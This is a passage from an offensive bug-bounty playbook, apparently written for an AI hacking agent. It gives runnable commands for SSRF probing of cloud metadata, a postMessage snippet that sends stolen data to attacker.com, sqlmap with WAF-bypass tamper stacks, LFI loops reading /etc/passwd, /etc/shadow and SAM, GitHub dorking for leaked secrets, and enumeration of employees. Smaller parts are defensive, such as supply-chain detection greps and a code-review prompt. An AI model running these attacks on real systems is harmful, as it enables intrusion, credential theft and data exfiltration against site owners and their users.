  grep -oP '(\?|&)(url|dest|redirect|uri|path|continue|window|next|data|reference|site|html|val|validate|domain|callback|return|page|feed|host|port|to|out|view|dir|file|load|read|image|img|src|href|action|target)=[^&\s]+' | \
  sort -u > /home/kali/Targets/targets/TARGET_NAME/recon/target_ssrf_params.txt

# Overlap with LFI params — these same params can often do BOTH LFI and SSRF
# ptLFI.txt has: file, page, path, load, read, include, template, doc, etc.
if [ -s /home/kali/Targets/targets/TARGET_NAME/recon/ptLFI.txt ]; then
  cat /home/kali/Targets/targets/TARGET_NAME/recon/ptLFI.txt >> /home/kali/Targets/targets/TARGET_NAME/recon/target_ssrf_params.txt
  sort -u -o /home/kali/Targets/targets/TARGET_NAME/recon/target_ssrf_params.txt /home/kali/Targets/targets/TARGET_NAME/recon/target_ssrf_params.txt
  echo "Merged $(wc -l < /home/kali/Targets/targets/TARGET_NAME/recon/ptLFI.txt) LFI-prone params into SSRF test list"
fi

# Brute-force common SSRF param names on discovered endpoints even if not found in recon
# These params might be undocumented — endpoint accepts them but they never appeared in URL history
cat /home/kali/Targets/targets/TARGET_NAME/recon/target_paths.txt | sort -u | head -50 > /home/kali/Targets/targets/TARGET_NAME/recon/target_ssrf_endpoints.txt
for param in url dest redirect uri path continue window next data reference site html val validate domain callback return page feed host port to out view dir file load read image img src href action target; do
  cat /home/kali/Targets/targets/TARGET_NAME/recon/target_ssrf_endpoints.txt | while read base; do
    # Only add if this param wasn't already found on this endpoint
    if ! grep -q "$base?$param=" /home/kali/Targets/targets/TARGET_NAME/recon/target_ssrf_params.txt 2>/dev/null; then
      echo "${base}?${param}={TARGET}" >> /home/kali/Targets/targets/TARGET_NAME/recon/target_ssrf_params_bruteforce.txt
    fi
  done
done | sort -u > /home/kali/Targets/targets/TARGET_NAME/recon/target_ssrf_params_bruteforce.txt
echo "Added brute-forced params from $(wc -l < /home/kali/Targets/targets/TARGET_NAME/recon/target_ssrf_endpoints.txt) endpoints → target_ssrf_params_bruteforce.txt"
```

**Step 2: Automated SSRF testing with ssrfmap**
```bash
# Test each vulnerable parameter
cat /home/kali/Targets/targets/TARGET_NAME/recon/target_ssrf_params.txt | while read line; do
  param=$(echo "$line" | cut -d= -f1 | tr -d '?&')
  url=$(echo "$line" | cut -d= -f1 --complement | tr -d '?&')
  python3 /home/kali/Tools/ssrfmap/ssrfmap.py -u "https://target.com/page?$param=COLLABORATOR" \
    -p "$param" --method GET 2>/dev/null
done

# Or test a single endpoint manually with interactsh
interactsh-client -v 2>/dev/null &
sleep 3
# Use the generated collaborator URL: http://RANDOM.oast.fun
curl -s "https://target.com/page?url=http://COLLABORATOR_URL"
```

**Step 3: OOB callback detection with interactsh**
```bash
# Start interactsh listener
interactsh-client -n 30 -v 2>&1 | tee /home/kali/Targets/targets/TARGET_NAME/recon/target_oob.txt

# Test SSRF with the generated OOB URL
# Poll interactsh for callbacks — if you see a DNS/HTTP hit from target.com, SSRF confirmed
```

**Step 4: PostMessage SSRF (cross-origin data exfiltration)**
```javascript
// If the target has a postMessage handler that fetches URLs from messages:
// e.g., onmessage = (e) => { fetch(e.data.url).then(r => r.text()).then(t => e.source.postMessage(t, "*")) }

// Attacker page:
iframe.contentWindow.postMessage({url: "http://169.254.169.254/latest/meta-data/"}, "*");

// Listen for response:
window.addEventListener("message", (e) => {
  fetch("https://attacker.com/exfil?data=" + btoa(e.data));
});
```

**Step 5: Manual SSRF probes if automation fails**
```bash
# Test each pattern individually
for url in "http://169.254.169.254/latest/meta-data/" "http://localhost:5000" "http://127.0.0.1:22" "file:///etc/passwd"; do
  for param in "url" "dest" "redirect" "uri" "path" "file" "load" "page" "fetch" "src" "host"; do
    curl -s -m 3 "https://target.com/page?$param=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$url'))")" \
      -o /dev/null -w "%{http_code} %{size_download}B"
    echo " — $param=$url"
  done
done
```

**SSRF methodology — same responsive approach:**
- If ssrfmap gets blocked → load `hunt-ssrf` skill and try bypass techniques
  - URL encoding / double encoding
  - DNS rebinding (change IP between lookup and request)
  - Redirect-based bypass (attacker.com → 302 → 169.254.169.254)
  - Different protocols: `http://`, `file://`, `gopher://`, `dict://`
- If all bypasses fail → flag as **"Potential SSRF — WAF/proxy detected, bypass attempts failed"**
- Track: which params triggered, what blocked it, which bypasses tried

**Local skill references for deeper SSRF testing:**
```
# SSRF
hunt-ssrf                   — 15 published SSRF findings methodology
offensive-ssrf              — SSRF exploitation techniques
securityfortech/ssrf         — SSRF detection and bypass cookbook

# Cloud metadata exploitation
offensive-cloud             — Cloud SSRF targets (AWS, Azure, GCP)
cloud-iam-deep              — IAM privilege escalation via metadata

# SSRF tools
ssrfmap                     — /home/kali/Tools/ssrfmap/
interactsh-client           — OOB callback detection
```
Load with: `skill_load` / skill playbook, then apply patterns in HH.

---

## OPTIONAL EXPLOITATION — Run when R11 flags potential vulnerabilities

### E1: SQLi Exploitation — BSQLi 2.0 + sqlmap
Run after R11 flags **"Potential SQLi — WAF detected"** or confirms SQL injection.

```bash
# Step 1: BSQLi 2.0 — fast blind SQLi scanner on flagged endpoints
# R11 saved flagged URLs to /home/kali/Targets/targets/TARGET_NAME/recon/psqli.txt
python3 /home/kali/Tools/BSQLi-2.0/src/bsqli2.0.py \
  -l /home/kali/Targets/targets/TARGET_NAME/recon/psqli.txt \
  --generate-payloads -o /home/kali/Targets/targets/TARGET_NAME/recon/target_bsqli_results.csv

# Check the CSV for confirmed vulnerabilities
cat /home/kali/Targets/targets/TARGET_NAME/recon/target_bsqli_results.csv 2>/dev/null | column -t -s',' | head -20

# Step 2: If CSV shows nothing exploitable → sqlmap on the same targets
cat /home/kali/Targets/targets/TARGET_NAME/recon/psqli.txt | while read url; do
  sqlmap -u "$url" \
    --dbs --random-agent --tamper=space2comment --time-sec=5 \
    --batch --level=3 --risk=2 2>/dev/null | tee -a /home/kali/Targets/targets/TARGET_NAME/recon/target_sqlmap.txt
done

# Or use a saved request (from Burp)
sqlmap -r /home/kali/Targets/targets/TARGET_NAME/recon/request_sqli.txt \
  --dbs --random-agent --tamper=space2comment --time-sec=5 \
  --batch --level=3 --risk=2 2>/dev/null | tee /home/kali/Targets/targets/TARGET_NAME/recon/target_sqlmap.txt

# WAF bypass tamper stack:
# --tamper=between,bluecoat,charencode,charunicodeencode,equaltolike,
#          halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,
#          percentage,randomcase,space2comment,space2dash,space2hash,
#          space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,
#          space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
```
- BSQLi 2.0 first: fast, focused on blind SQLi with time-based detection
- sqlmap fallback: deeper enumeration (--dbs, tables, dump)
- Multiple tamper scripts stacked: `--tamper=space2comment,randomcase,between`
- Use `-r request.txt` for authenticated/payload-specific endpoints from Burp

---

### E2: LFI + Path Traversal Exploitation
Run after R7 saves `ptLFI.txt` with LFI-prone parameters. R8 (whatweb) tells you the OS.

```bash
# Step 1: Reference best payloads from PayloadsAllTheThings
# Quick check:     simple-check.txt
# Linux:           Linux-files.txt
# Windows:         Windows-files.txt
# Traversal:       Traversal.txt, dot-slash-PathTraversal_and_LFI_pairing.txt
# Bypasses:        JHADDIX_LFI.txt (null byte, double encoding)
# FD brute:        LFI-FD-check.txt (/proc/self/fd/0-30)
# PHP filter:      php-filter-iconv.txt
# Full list:       List_Of_File_To_Include.txt

# Directory Traversal payloads (for file download endpoints like /download?file=FILENAME):
# deep_traversal.txt              8-deep + encoding variants
# directory_traversal.txt          Windows + hex encoding
# dotdotpwn.txt                    Mixed Linux/Windows patterns
# traversals-8-deep-exotic-encoding.txt  Double encoding + exotic
# Path: /home/kali/Tools/PayloadsAllTheThings/Directory\ Traversal/Intruder/

# Step 2: Test with Linux paths (if whatweb detected Linux)
for payload in /etc/passwd /etc/shadow /proc/self/environ /proc/self/cmdline; do
  cat /home/kali/Targets/targets/TARGET_NAME/recon/ptLFI.txt | while read line; do
    param=$(echo "$line" | cut -d= -f1 | tr -d '?&')
    url_base=$(echo "$line" | cut -d= -f1)
    curl -s -m 5 "$url_base$param=../../../../../..$payload" | grep -qi "root:" && \
      echo "✅ LFI: $url_base$param=../../../../../..$payload"
  done
done

# Step 3: Test with Windows paths (if whatweb detected Windows)
for payload in "C:\\boot.ini" "C:\\WINDOWS\\win.ini" "C:\\WINDOWS\\System32\\Config\\SAM"; do
  cat /home/kali/Targets/targets/TARGET_NAME/recon/ptLFI.txt | while read line; do
    param=$(echo "$line" | cut -d= -f1 | tr -d '?&')
    url_base=$(echo "$line" | cut -d= -f1)
    curl -s -m 5 "$url_base$param=..\\..\\..\\..\\..\\..$payload" | grep -qi "\[fonts\]" && \
      echo "✅ LFI Windows: $url_base$param=..\\..\\..\\..\\..\\..$payload"
  done
done

# Step 4: PHP wrapper (if whatweb detected PHP)
# Full PHP filter chain at /home/kali/Tools/PayloadsAllTheThings/File\ Inclusion/Intruders/php-filter-iconv.txt
curl -s -m 5 "$url_base$param=php://filter/convert.base64-encode/resource=index.php" | \
  grep -oP 'PD9waHA[^"]+' > /dev/null && \
  echo "✅ PHP Wrapper: $url_base$param=php://filter/convert.base64-encode/resource=index.php"

# Step 5: /proc/self/fd/ brute force (for log poisoning)
for fd in $(seq 0 30); do
  cat /home/kali/Targets/targets/TARGET_NAME/recon/ptLFI.txt | while read line; do
    param=$(echo "$line" | cut -d= -f1 | tr -d '?&')
    url_base=$(echo "$line" | cut -d= -f1)
    result=$(curl -s -m 3 "$url_base$param=../../../../../proc/self/fd/$fd" 2>/dev/null)
    if [ -n "$result" ] && [ ${#result} -gt 50 ]; then
      echo "📁 FD $fd → ${result:0:80}"
    fi
  done
done | tee /home/kali/Targets/targets/TARGET_NAME/recon/target_lfi_results.txt
```

**LFI bypass techniques (if blocked):**
```
# Double encoding
?page=%252e%252e%252fetc%252fpasswd

# Null byte (PHP < 5.3.4)
?page=../../../etc/passwd%00

# Path truncation (200+ chars)
?page=../../../etc/passwd././././././././[...]./././././

# Wrapper bypass
?page=php://filter/convert.base64-encode/resource=../../../etc/passwd

# Expected path + traversal
?page=/var/www/html/../../../etc/passwd

# Full reference: /home/kali/Tools/PayloadsAllTheThings/File\ Inclusion/
# Directory traversal: /home/kali/Tools/PayloadsAllTheThings/Directory\ Traversal/
```

**Local skill references:**
```
# LFI
hunt-lfi                    — LFI/RFI testing methodology
offensive-file-upload       — File upload + LFI chaining

# Path Traversal
securityfortech/path-traversal — Directory traversal detection
```
Load with: `skill_load` / skill playbook, then apply patterns in HH.

---

## OPTIONAL RECON — Run only when instructed

### R14: GitHub Recon
**Prerequisite:** GitHub personal access token (classic with `repo` and `user` scopes)
- Get one at: https://github.com/settings/tokens
- Save to `~/.github_token` or `$GH_TOKEN`

#### R14a: Automated Dorking — Github_Brute-Dork + Github-Dorks + github-search
```bash
# Tool 1: Github_Brute-Dork — 1760 search patterns against org
python3 /tmp/Github_Brute-Dork/github_brutedork.py \\
  -o TARGET_ORG -t YOUR_GITHUB_TOKEN -d 2>/dev/null | tee /home/kali/Targets/targets/TARGET_NAME/recon/target_gh_dorks.txt

# Tool 2: Github-Dorks (techgaun) — multi-query dorking
# https://github.com/techgaun/github-dorks
python3 /tmp/github-dorks/github-dork.py -u TARGET_ORG -t YOUR_GITHUB_TOKEN 2>/dev/null

# Tool 3: github-search (gwen001) — recursive multi-repo search
# https://github.com/gwen001/github-search
python3 /tmp/github-search/github-search.py -o TARGET_ORG -t YOUR_GITHUB_TOKEN 2>/dev/null

# All results merged into target_gh_dorks.txt
```

#### R14b: Manual GitHub Dorking
Search patterns to run manually on `github.com/search` — or automate via API with the keyword list:

**Keyword list:** `/home/kali/Tools/keywords.txt` (1,592 patterns from random-robbie/keywords)
Download it:
```bash
curl -sL "https://raw.githubusercontent.com/random-robbie/keywords/master/keywords.txt" \
  -o /home/kali/Tools/keywords.txt
wc -l /home/kali/Tools/keywords.txt
```

**Automated dorking with the full keyword list:**
```bash
while IFS= read -r keyword; do
  [ -z "$keyword" ] && continue
  count=$(curl -s -H "Authorization: token $GH_TOKEN" \
    "https://api.github.com/search/code?q=${keyword}+org:TARGET_ORG&per_page=1" 2>/dev/null | \
    python3 -c "import json,sys; print(json.load(sys.stdin).get('total_count',0))" 2>/dev/null)
  [ "$count" -gt 0 ] && echo "🔴 $keyword → $count results" >> target_gh_dorks.txt
done < /home/kali/Tools/keywords.txt
```

**Manual search patterns — organized by category:**

```bash
# Save dork queries for quick reference
cat > /home/kali/Tools/github_dorks.txt << 'DORKS'
=== Files ===
filename:manifest.xml
filename:travis.yml
filename:vim_settings.xml
filename:database
filename:prod.exs NOT prod.secret.exs
filename:prod.secret.exs
filename:.npmrc _auth
filename:.dockercfg auth
filename:WebServers.xml
filename:.bash_history <DOMAIN>
filename:sftp-config.json
filename:sftp.json path:.vscode
filename:secrets.yml password
filename:.esmtprc password
filename:passwd path:etc
filename:dbeaver-data-sources.xml
path:sites databases password
filename:config.php dbpasswd
filename:configuration.php JConfig password
filename:.sh_history
shodan_api_key language:python
filename:shadow path:etc
JEKYLL_GITHUB_TOKEN
filename:proftpdpasswd
filename:.pgpass
filename:idea14.key
filename:hub oauth_token
HEROKU_API_KEY language:json
HEROKU_API_KEY language:shell
SF_USERNAME salesforce
filename:.bash_profile aws
extension:json api.forecast.io
filename:.env MAIL_HOST=smtp.gmail.com
filename:wp-config.php
extension:sql mysql dump
filename:credentials aws_access_key_id
filename:id_rsa
filename:id_dsa

=== Languages ===
language:python <DOMAIN>
language:php <DOMAIN>
language:sql <DOMAIN>
language:html password
language:perl password
language:shell <DOMAIN>
language:java api
HOMEBREW_GITHUB_API_TOKEN language:shell

=== API Keys, Tokens, Passwords ===
api_key
"api keys"
authorization_bearer:
oauth
auth
authentication
client_secret
api_token:
"api token"
client_id
password
user_password
user_pass
passcode
client_secret
secret
password hash
OTP
user auth

=== Usernames ===
user:admin
org:google type:users
in:login
in:name
fullname:firstname lastname
in:email

=== Dates ===
created:<2012-04-05
created:>=2011-06-12
created:2016-02-07 location:iceland
created:2011-04-06..2013-01-14

=== Extensions ===
extension:pem private
extension:ppk private
extension:sql mysql dump
extension:sql mysql dump password
extension:json api.forecast.io
extension:json mongolab.com
extension:yaml mongolab.com
extension:ica [WFClient] Password=
extension:avastlic "support.avast.com"
extension:json googleusercontent client_secret
DORKS
echo "Saved $(wc -l < /home/kali/Tools/github_dorks.txt) dork queries"
```

**Usage:**
```bash
# For each dork query, search: https://github.com/search?q=<dork>+org:TARGET_ORG
# Or via API:
while read -r dork; do
  [ -z "$dork" ] || [[ "$dork" =~ ^=== ]] && continue
  count=$(curl -s -H "Authorization: token $GH_TOKEN" \
    "https://api.github.com/search/code?q=${dork}+org:TARGET_ORG" 2>/dev/null | \
    python3 -c "import json,sys; print(json.load(sys.stdin).get('total_count',0))" 2>/dev/null)
  [ "$count" -gt 0 ] && echo "$dork → $count results"
done < /home/kali/Tools/github_dorks.txt | tee target_gh_dorks.txt

#### R14c: PR/Commit/Issue Scanning — Sensitive Data in Non-Code
Don't just scan files — scan PRs, commits, and issues too. These are common leak vectors:

```bash
# 1. Search pull requests for keyword hits
for q in "password" "secret" "api_key" "token" "AKIA" "sk_live_" ".env"; do
  curl -s -H "Authorization: token $GH_TOKEN" \
    "https://api.github.com/search/issues?q=${q}+org:TARGET_ORG+type:pr&per_page=10" 2>/dev/null | \
    python3 -c "import json,sys; d=json.load(sys.stdin); [print(f'PR #{i[\"number\"]} - {i[\"repository_url\"].split(\"/\")[-1]} - {i[\"title\"][:60]}') for i in d.get('items',[])]" 2>/dev/null
done | tee target_gh_pr_leaks.txt

# 2. Search commits for credential patterns
for q in "password" "secret" "api_key" "token" "AKIA"; do
  curl -s -H "Authorization: token $GH_TOKEN" \
    "https://api.github.com/search/commits?q=${q}+org:TARGET_ORG&per_page=5" 2>/dev/null | \
    python3 -c "import json,sys; d=json.load(sys.stdin); print(f'{q}: {d.get(\"total_count\",0)} commit hits')" 2>/dev/null
done | tee target_gh_commit_leaks.txt

# 3. Check recent PR descriptions and comments for internal references
curl -s -H "Authorization: token $GH_TOKEN" \
  "https://api.github.com/search/issues?q=org:TARGET_ORG+type:pr+is:open&per_page=20&sort=updated" 2>/dev/null | \
  python3 -c "
import json,sys; d=json.load(sys.stdin)
for i in d.get('items',[]):
  body = i.get('body','') or ''
  if any(w in body.lower() for w in ['http://','internal','staging','credential','token','secret','password']):
    print(f'🔴 PR #{i[\"number\"]} - {i[\"repository_url\"].split(\"/\")[-1]} - {i[\"title\"][:50]}')
" 2>/dev/null | tee target_gh_pr_review.txt
```

**Why PRs/commits matter:** Developers often temporarily push credentials for testing, then remove them in a follow-up commit. But the credential remains in git history and PR comments. `trufflehog` catches this for commits, but PR descriptions/comments are a separate vector.

### R15: Code Review — Full Source Analysis via Hacker-Harness
When you have a GitHub repo URL, run this as a standalone step — not part of the automated dorking pipeline:

**Input:** GitHub repo URL (e.g., `https://github.com/ezcater/ezcater_rubocop`)
**Goal:** Full codebase comprehension + vulnerability discovery + secret scanning

#### Step 1: Clone and Dork — SAST is a first pass
```bash
REPO="https://github.com/ezcater/ezcater_rubocop"

# 📖 prior engagement lesson: Semgrep and Bandit catch known patterns but miss novel logic flaws.
# They are useful first passes. The real depth comes in Step 4 (HH deep review).
# See: https://projectblack.io/blog/local-ai-for-cyber-security/
REPO_NAME=$(echo "$REPO" | grep -oP '[a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+$' | tr '/' '_')
CLONE_DIR="/tmp/repos/$REPO_NAME"

git clone --depth 1 "$REPO" "$CLONE_DIR" 2>/dev/null

# Run quick dorking on the cloned repo
grep -rP '(password|secret|api_key|token|AKIA|sk_live_|BEGIN (RSA|DSA|EC|PGP|OPENSSH) PRIVATE KEY)' \
  "$CLONE_DIR" --include="*.{py,rb,js,ts,go,java,php,yml,yaml,json,env,config}" 2>/dev/null | \
  grep -v "node_modules\|\.git/" | tee target_code_review_secrets.txt

# If Python code detected, run bandit security linter
if find "$CLONE_DIR" -name "*.py" | head -1 | grep -q .; then
  bandit -r "$CLONE_DIR" -f json -o target_code_review_bandit.json 2>/dev/null
  bandit -r "$CLONE_DIR" -f txt 2>/dev/null | tee target_code_review_bandit.txt
  echo "Bandit analysis complete — $(grep -c '>> Issue:' target_code_review_bandit.txt 2>/dev/null || echo 0) issues found"
fi

# Run semgrep — multi-language SAST (always, regardless of language)
# Covers: RCE, SQLi, OS command injection, XSS, hardcoded secrets, crypto misconfigs
# Languages: Python, JavaScript, TypeScript, Go, Java, Ruby, PHP, C#, Rust, Kotlin, Swift, C/C++
if command -v semgrep &>/dev/null; then
  semgrep --config=auto "$CLONE_DIR" --json -o target_code_review_semgrep.json 2>/dev/null
  semgrep --config=auto "$CLONE_DIR" 2>/dev/null | tee target_code_review_semgrep.txt
  echo "Semgrep analysis complete — $(grep -c 'Finding:' target_code_review_semgrep.txt 2>/dev/null || echo 0) findings"
fi

# Feed automated results into HH deep-review context (reference only)
echo "SAST results saved. Bandit: target_code_review_bandit.txt, Semgrep: target_code_review_semgrep.txt"
echo "Note: HH conducts an independent review."
Step 2: Runs Step 1 first, then HH reviews findings

### Step 3: Supply Chain Attack Detection
After clone and before HH review, run supply chain checks on dependencies:

```bash
# 1. Check package manifests for typosquatting risk
if find "$CLONE_DIR" -name "package.json" | head -1 | grep -q .; then
  python3 << 'PYEOF'
import json, os, re
# Common typosquatting patterns: letter swap, missing letter, extra letter
SUSPICIOUS = [
    r'(?i)requst', r'(?i)expresss', r'(?i)angualr', r'(?i)reacct',
    r'(?i)webpackk', r'(?i)typescrip', r'(?i)javascrip', r'(?i)eslintt',
    r'(?i)babelk', r'(?i)webhookk', r'(?i)axiosx', r'(?i)lodashh',
    r'(?i)momentt', r'(?i)chalkk', r'(?i)debugg', r'(?i)body-parsrr',
]
CLONE_DIR = os.environ.get('CLONE_DIR', '.')
for root, dirs, files in os.walk(CLONE_DIR):
    if 'node_modules' in root or '.git' in root:
        continue
    for f in files:
        if f == 'package.json':
            path = os.path.join(root, f)
            with open(path) as fh:
                data = json.load(fh)
                for section in ['dependencies', 'devDependencies']:
                    for pkg in data.get(section, {}):
                        for pattern in SUSPICIOUS:
                            if re.search(pattern, pkg):
                                print(f"⚠️ TYPOSQUAT? {pkg} in {path}")
PYEOF
fi

# 2. Check for dependency confusion (private-sounding packages)
grep -rP '"(internal|private|company|enterprise|ezcater)[-_][a-z]+"' \
  "$CLONE_DIR" --include="package.json" --include="Gemfile" \
  --include="requirements.txt" --include="go.mod" 2>/dev/null | \
  tee -a target_code_review_supplychain.txt

# 3. Check for pinned/untrusted CI/CD actions
grep -rP 'uses: [a-zA-Z0-9_-]+/[a-zA-Z0-9_-]+@[a-f0-9]{7,40}' \
  "$CLONE_DIR/.github/workflows/" 2>/dev/null | \
  tee -a target_code_review_supplychain.txt

# 4. Check install scripts for suspicious behavior
grep -rP '(curl.*\||wget.*\||http.*(exfil|leak|callback|request))' \
  "$CLONE_DIR" --include="*.sh" --include="*.js" --include="*.py" \
  --include="Makefile" --include="Dockerfile" 2>/dev/null | \
  grep -iv "node_modules\|\.git" | \
  tee -a target_code_review_supplychain.txt

# 5. Run Medusa — 40,000+ detection patterns (SAST + supply chain + secrets)
#    medusa scan /path/to/repo
# 6. Run malcontent — 14,500+ YARA rules for supply chain compromise detection
if command -v malcontent &>/dev/null; then
  malcontent analyze "$CLONE_DIR" --min-risk medium --format json \
    -o target_code_review_malcontent.json 2>/dev/null
  malcontent analyze "$CLONE_DIR" --min-risk medium --format markdown \
    -o target_code_review_malcontent.md 2>/dev/null
  echo "Malcontent analysis complete — $(grep -c 'risk' target_code_review_malcontent.json 2>/dev/null || echo 0) findings"
fi

# 6. Check lockfiles for known malicious packages
# (future: could integrate with npm audit, pip-audit, or OSV-Scanner)
```

**Reference simulator:** https://github.com/RAJANAGORI/supply-chain-attack-simulator — 22 scenarios covering typosquatting, dep confusion, CI/CD tampering, malicious install scripts.

**Reference monitor:** https://github.com/elastic/supply-chain-monitor — differential analysis of PyPI/npm releases via LLM. Detects obfuscation, unexpected net calls, added deps, backdoors. For our pipeline: when reviewing a repo's dependency changes (git diff on package.json/Gemfile/requirements.txt), apply the same diff → LLM analysis approach.

### Step 4: HH Full Code Review — Independent Analysis

**🚨 Learnings from prior engagement:** File selection matters more than model capability. Once pointed at the right file, every model found the vulnerability instantly. Our data flow (gwjs_endpoints → Arjun → mined_pendpoint → HH) already does this by narrowing the target before HH reviews.
```bash
# Hacker-Harness does an independent review of the codebase from scratch.
# Tools (Bandit, Semgrep) ran in Step 1 are reference only — HH finds its own findings by
# actually reading the source code: module structure, imports, route definitions, middleware,
# auth decorators, data flow, business logic. Not regex patterns.
# HH / spawn_agent: "Read the codebase at '$CLONE_DIR' and conduct a full security review.
Then output the findings to /home/kali/Targets/TARGET_NAME/recon/target_code_review.md

=== REVIEW PROMPT ===
Analyze $CLONE_DIR comprehensively:

1. TECHNOLOGY STACK
   - Primary language and framework (with versions)
   - All dependencies listed in: package.json, Gemfile, requirements.txt, go.mod, Cargo.toml, etc.
   - Database adapters, ORM, cache layer, message queue connections
   - Web framework (Rails/Django/Express/Spring/Flask/etc.)
   - Auth middleware (Devise, JWT, OAuth, session-based)
   - Build tools, CI/CD config

2. ARCHITECTURE OVERVIEW
   - Project structure (directories, modules, components)
   - All exposed API routes/endpoints (list them all)
   - Authentication flow: how users login, session management, token validation
   - Authorization model: RBAC, ownership checks, scoping patterns
   - Input validation: where and how user input is sanitized
   - Data flow: how data moves from input → storage → response
   - Background jobs, scheduled tasks, webhook handlers

3. CRITICAL SECURITY FINDINGS (P1-P3)
   For each finding, provide:
   [TYPE] file:line — what was found
   [IMPACT] what an attacker can achieve
   [EVIDENCE] relevant code snippet (5-10 lines)
   [FIX] how to remediate

   Categories to check:
   - P1: RCE (eval, exec, shell, system calls), SQL injection (raw queries, string interpolation),
          Authentication bypass (missing auth decorators, hardcoded admin checks),
          Privilege escalation (role manipulation, missing ownership checks)
   - P2: IDOR (missing object ownership verification),
          SSRF (user-controlled URLs fetched by server),
          Hardcoded credentials (passwords, API keys, tokens, JWTs, certs),
          Insecure crypto (MD5, SHA1, weak cipher, hardcoded IV/key),
          Mass assignment (accepting all params without allowlist)
   - P3: Information disclosure (stack traces, debug endpoints, version banners),
          Missing security headers (CSP, HSTS, X-Frame-Options),
          Rate limiting gaps (no throttle on auth endpoints, no brute-force protection),
          Insecure direct object references in URLs

4. BUSINESS LOGIC VULNERABILITIES
   - Payment/billing flows (price manipulation, free trial bypass)
   - User management (account takeover, email verification bypass)
   - Admin functionality (hidden endpoints, debug interfaces)
   - File upload/download (path traversal, MIME type bypass)
   - Data export (mass data extraction, CSV injection)
   - Webhook/notification systems (SSRF via webhook URLs)
   - Race conditions (concurrent operations, lock-free updates)

5. COMPLIANCE & CONFIGURATION
   - Environment variables expected (.env.example, config files)
   - Third-party service integrations (Stripe, AWS, GCP, Sentry, Datadog)
   - Secrets stored in source vs environment
   - Debug/development configuration that could leak in production

OUTPUT FORMAT:
Write findings to: /home/kali/Targets/TARGET_NAME/recon/target_code_review.md

Structure the output as:
# Code Review: $REPO_NAME
## Tech Stack
## Architecture
## Security Findings (P1 > P2 > P3)
## Business Logic
## Configuration & Secrets

Do NOT include false positives (test fixtures, sample data, documentation).
Only flag real vulnerabilities and hardcoded credentials.' Enter
```

### Report Format — Every Finding (Any R Step)
When documenting any finding — whether from GitHub recon, code review, or web recon — use this format:

```markdown
### P1-N: Step — Finding Title
**URL:** `https://target.com/path` or `https://github.com/ORG/repo/blob/main/path#L10-L26`
**Line:** `path/to/file.rb:10-26` (omit if not applicable)
**Type:** Vulnerability class
**Description:** One sentence explaining what and where.
**Impact:** What an attacker can achieve.
**Snippet:**
```language
<5-10 lines of actual evidence>
```
```

**Rules:**
- **URL** must be clickable — points directly to the vulnerable artifact
- **Line** must match the URL (omit for non-file findings like email addresses)
- **Snippet** must be short (5-10 lines) — actual evidence, not hypothetical
- Applies to: GitHub recon (R14), code review (R15), AND all other R steps

### Hunt Log — Track Every Session
For every new target, create a `hunt-log.md` in the target directory. This tracks what was done, found, and remaining — survives between sessions.

```markdown
# Hunt Log — TARGET_NAME
**Date:** YYYY-MM-DD
**Auth:** [cookies/tokens/unauth]
**Mode:** [SCOPEONLY / WILDCARD]

## Phase Summary
| Phase | Status | Notes |
|-------|--------|-------|
| SCOPE | Done | URL_ONLY/WILDCARD |
| RECON | Done/Pending | What was covered |
| RANK | Done/Pending | Findings prioritized |
| HUNT | Done/Pending | Exploitation attempted |
| VALIDATE | Done/Pending | Findings verified |
| REPORT | Done/Pending | Report written |

## Findings
### P1 — Critical
- Finding name: description, impact, PoC

### P2 — High
- ...

## What We Tried
- ✅ Worked: what succeeded
- ❌ Failed: what didn't
- ⏳ Pending: what remains

## Remaining Surface
- What wasn't tested and why
```

See `~/Targets/hunt-memory/mealprogram-staging-ezcater/hunt-log.md` for a real example.

#### R14c: Secret Scanning — trufflehog + gitleaks
```bash
# Depth-first scan of known org repos
trufflehog github --org=TARGET_ORG --only-verified 2>/dev/null | tee /home/kali/Targets/targets/TARGET_NAME/recon/target_trufflehog.txt

# Or scan specific repo
trufflehog git https://github.com/TARGET_ORG/repo-name --only-verified 2>/dev/null

# Gitleaks on cloned repo
gitleaks detect --source /tmp/repos/target --report-format json --report-path /home/kali/Targets/targets/TARGET_NAME/recon/target_gitleaks.json
```

#### R14d: Employee Pivot — Find contributor accounts
```bash
# Find org members' personal repos
curl -s -H "Authorization: token *** \
  "https://api.github.com/orgs/TARGET_ORG/members" | \
  python3 -c "import json,sys;[print(u['login']) for u in json.load(sys.stdin)]" > /home/kali/Targets/targets/TARGET_NAME/recon/target_employees.txt

# For each employee, search their repos for company data
for user in $(cat /home/kali/Targets/targets/TARGET_NAME/recon/target_employees.txt); do
  curl -s -H "Authorization: token *** \
    "https://api.github.com/users/$user/repos?per_page=50" | ...
done
```

### R16: Port Scanning (URL_ONLY — same host)
```bash
rustscan -a $(curl -s -I https://target.com | grep -i "^location:\|^host:" | head -1 | awk '{print $2}' | cut -d: -f1 | tr -d '\r') --range 1-10000 2>/dev/null | tee /home/kali/Targets/targets/TARGET_NAME/recon/target_ports.txt

# Or use naabu if available
naabu -host target.com -p 80,443,8080,8443,3000,5000,6006,8000,9000,9090 2>/dev/null | tee /home/kali/Targets/targets/TARGET_NAME/recon/target_ports.txt
```
- Even on URL_ONLY scope, the same host may have other ports open
- Common: 8080 (Jenkins), 5000 (MLflow), 3000 (Grafana), 6006 (TensorBoard)
- **Scope note:** Only scan if the IP belongs to the same target. For shared hosting (Cloudflare proxied IPs), skip port scanning.

### R17: Directory/Endpoint Fuzzing — feroxbuster (preferred) / ffuf

**feroxbuster** is preferred over ffuf because it automatically handles recursion and has built-in filtering:

```bash
# Quick scan with recursion + status filter
feroxbuster -u https://target.com -w /usr/share/wordlists/dirb/common.txt \
  -x php,html,txt,json -d 2 --filter-status 404,403 \
  -o /home/kali/Targets/targets/TARGET_NAME/recon/target_ferox.txt 2>/dev/null

# API endpoint scan
feroxbuster -u https://target.com/api -w /usr/share/wordlists/api_small.txt \
  -x json,xml -d 1 --filter-status 404,403,500 \
  -o /home/kali/Targets/targets/TARGET_NAME/recon/target_api_ferox.txt 2>/dev/null
```
- `-d 2` = recursion depth 2 (finds nested paths like `/admin/users/`)
- `-x` = extension bruteforce (try each path with .php, .html, .txt, .json)
- Built-in filtering by status, size, line count, word count
- Auto-discovers the "wall" and filters it without manual two-pass

**ffuf alternative** (when feroxbuster isn't available):
```bash
# First pass — discover wall pattern
